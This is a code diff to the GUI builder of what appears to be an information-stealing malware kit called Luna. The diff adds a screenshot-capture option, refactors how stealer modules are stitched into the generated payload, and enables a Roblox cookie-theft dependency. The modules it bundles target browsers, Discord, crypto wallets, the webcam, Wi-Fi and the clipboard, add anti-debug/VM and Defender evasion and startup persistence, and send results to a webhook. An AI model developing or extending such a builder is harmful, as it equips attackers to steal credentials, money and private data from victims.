@@ -66,6 +66,7 @@ class App(ctk.CTk):
             "clipboard": False,
             "webcam": False,
             "games": False,
+            "screenshot": False,
             "mutex": None
         }
 
@@ -157,6 +158,11 @@ class App(ctk.CTk):
             self.builder_frame, text="Anti Debug/Vm", font=ctk.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
         self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=150)
+
+        self.screenshot = ctk.CTkCheckBox(
+            self.builder_frame, text="Screenshot", font=ctk.CTkFont(size=17, family=self.font),
+            fg_color="#5d11c3", hover_color="#5057eb")
+        self.screenshot.grid(row=1, column=0, sticky="ne", padx=117, pady=150)
 
         self.discord = ctk.CTkCheckBox(
             self.builder_frame, text="Discord Info", font=ctk.CTkFont(size=17, family=self.font),
@@ -453,6 +459,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             "webcam": self.webcam,
             "wallets": self.wallets,
             "games": self.games,
+            "screenshot": self.screenshot
         }
 
         for key, checkbox in checkbox_mapping.items():
@@ -518,91 +525,33 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 copy_dict = copy.deepcopy(self.updated_dictionary)
                 config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
                 code = f"{config_str}\n\n{code}"
-                
-                if self.updated_dictionary["anti_spam"]:
-                    with open(options+"AntiSpam.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["common_files"]:
-                    with open(options+"CommonFiles.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["browser"]:
-                    with open(options+"Browsers.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["clipboard"]:
-                    with open(options+"Clipboard.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["antidebug_vm"]:
-                    with open(options+"Debug.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["defender"]:
-                    with open(options+"Defender.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["discord"]:
-                    with open(options+"Discord.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["fakeerror"]:
-                    with open(options+"Fake_error.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["injection"]:
-                    with open(options+"Injection.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["systeminfo"]:
-                    with open(options+"System.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["self_destruct"]:
-                    with open(options+"SelfDestruct.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["startup"]:
-                    with open(options+"Startup.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["wifi"]:
-                    with open(options+"Wifi.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"	
-                        
-                if self.updated_dictionary["webcam"]:
-                    with open(options+"Webcam.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-                
-                if self.updated_dictionary["wallets"]:
-                    with open(options+"Wallets.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
 
-                if self.updated_dictionary["games"]:
-                    with open(options+"Games.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
-
-                if self.updated_dictionary["roblox"]:
-                    with open(options+"Roblox.py", "r", encoding="utf-8") as f:
-                        code += f.read()
-                        code += "\n\n"
+                option_mapping = {
+                "anti_spam": "AntiSpam.py",
+                "common_files": "CommonFiles.py",
+                "browser": "Browsers.py",
+                "roblox": "Roblox.py",
+                "clipboard": "Clipboard.py",
+                "antidebug_vm": "Debug.py",
+                "defender": "Defender.py",
+                "discord": "Discord.py",
+                "fakeerror": "Fake_error.py",
+                "injection": "Injection.py",
+                "systeminfo": "System.py",
+                "self_destruct": "SelfDestruct.py",
+                "startup": "Startup.py",
+                "wifi": "Wifi.py",
+                "webcam": "Webcam.py",
+                "wallets": "Wallets.py",
+                "games": "Games.py",
+                "screenshot": "Screenshot.py"
+                }
+                
+                for key, filename in option_mapping.items():
+                    if self.updated_dictionary.get(key):
+                        with open(f"{options}{filename}", "r", encoding="utf-8") as f:
+                            code += f.read()
+                            code += "\n\n"
 
                 code += """Luna(__CONFIG__["webhook"])"""
 
@@ -656,8 +605,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt"],
                 "injection": ["psutil"],
                 "webcam": ["cv2"],
-                "systeminfo": ["psutil", "pycountry"]#,
-                #"roblox": ["browser-cookie3"]
+                "systeminfo": ["psutil", "pycountry"],
+                "roblox": ["browser-cookie3"]
             }
             
             included_modules_pyinstaller = [
@@ -681,6 +630,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "systeminfo": ["psutil", "pycountry"],
                 "webcam": ["cv2"],
                 "startup": ["shutil"],
+                "roblox": ["browser-cookie3"]
             }
 
             self.PrepareBound()
